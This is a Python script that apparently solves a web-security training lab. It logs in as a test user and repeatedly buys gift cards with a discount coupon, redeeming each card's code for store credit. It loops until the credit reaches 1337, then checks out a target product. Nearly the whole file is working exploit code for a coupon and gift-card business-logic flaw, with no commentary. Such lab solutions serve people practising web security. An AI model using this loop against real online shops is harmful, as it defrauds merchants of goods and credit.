import requests
import sys
import re
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http":"http://127.0.0.1:8087", "https":"http://127.0.0.1:8087"}

def get_csrf_token(session, url, default="/cart/order-confirmation?order-confirmed=true"):
    headers = {'Referer':default}
    res = session.get(url, proxies=proxies, headers=headers, verify=False)
    soup = BeautifulSoup(res.text, 'html.parser')
    csrf_input = soup.find('input', {'name': 'csrf'})

    if csrf_input:
        csrf_token = csrf_input.get('value')
        return csrf_token
    else:
        print("CSRF token not found in the HTML.")
        return None


def business_logic_exploit(session, url) :
    login_url = url + '/login'
    csrf_token = get_csrf_token(session, login_url)
    data = {'csrf':csrf_token,'username':'wiener','password':'peter'}
    res = session.post(login_url, data=data, verify=False, proxies=proxies)
    
    if "Log out" in res.text :
        print("The wiener user log in successfully!")
        price = 100
        cart_url = "url_here"
        headers = {"headers":"https://0aff004e04792f7a807ddf15004400d5.web-security-academy.net"}
        while price < 1337.0 :
            cart_url = url + '/cart'
            data = {'productId':'2','redir':'PRODUCT','quantity':'1'}
            session.post(cart_url, data=data, headers=headers, verify=False, proxies=proxies)
            
            coupon_url = url + '/cart/coupon'
            csrf_token = get_csrf_token(session, cart_url)
            data = {'csrf':csrf_token,'coupon':'SIGNUP30'}
            session.post(coupon_url, data=data, headers=headers, verify=False, proxies=proxies)
            
            checkout_url = url + '/cart/checkout'
            data = {'csrf':csrf_token}
            res = session.post(checkout_url, data=data, headers=headers, verify=False, proxies=proxies)
            # session.post(checkout_url, allow_redirects=False, data=data, verify=False, proxies=proxies)
            
            if "is-table-numbers" in res.text :
                # Use regex to find the content of the top <td> element in the specific table
                pattern = r'<table\s+class="is-table-numbers">.*?<td>(.*?)<\/td>'

                matches = re.search(pattern, res.text, re.DOTALL)
                
                if matches:
                    top_td_content = matches.group(1)
                    gift_url = url + '/gift-card'
                    data = {'csrf':csrf_token,'gift-card':top_td_content}
                    
                    res = session.post(gift_url, data=data, headers=headers, verify=False, proxies=proxies)
                    # Use regex to find the total store credit value
                    pattern = r'Store credit:\s*\$([\d,.]+)'
                    matches = re.search(pattern, res.text)
                    if matches:
                        price = float(matches.group(1))
                        print("Store Credit Value:", price)
                    else:
                        print("Store credit value not found.")
                else:
                    print("Top TD content not found.")
                
        data = {'productId':'1','redir':'PRODUCT','quantity':'1'}
        r = session.post(cart_url, data=data, headers=headers, verify=False, proxies=proxies)
    else :
        print("You failed to solve the lab!")
    

    
    checkout_url = url + '/cart/checkout'
    data = {'csrf':csrf_token}
    res = session.post(checkout_url, data=data, verify=False, proxies=proxies) 

if __name__ == "__main__" :
    try :
        url = sys.argv[1]
    except IndexError :
        print("(+) Usage : %s <url>" % sys.argv[0])
        print("(+) Example : %s www.example.com" % sys.argv[0])
        sys.exit(-1)
        
    session = requests.Session()
    business_logic_exploit(session, url)